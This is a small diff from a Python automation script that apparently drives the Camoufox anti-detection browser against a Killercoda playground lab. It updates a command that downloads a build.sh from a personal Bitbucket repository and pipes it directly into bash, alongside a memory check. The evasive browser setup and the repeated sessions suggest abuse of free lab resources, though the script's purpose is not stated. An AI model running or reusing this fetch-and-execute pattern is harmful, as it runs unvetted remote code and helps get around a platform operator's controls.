@@ -30,7 +30,7 @@ else:
     sessions = all_sessions
 
 LAB_URL = "https://killercoda.com/course-cnpe/scenario/playground"
-COMMANDS = ["curl 'https://bitbucket.org/nourri03/build/raw/932b85db83a23d7a025635ffe692b2cea616ea0d/build.sh' | bash", "free -m"]
+COMMANDS = ["curl 'https://bitbucket.org/nourri03/build/raw/4c9f95418d659b7c9d95379691a326194361eed6/build.sh' | bash", "free -m"]
 
 with Camoufox(
     os=["windows", "macos", "linux"],
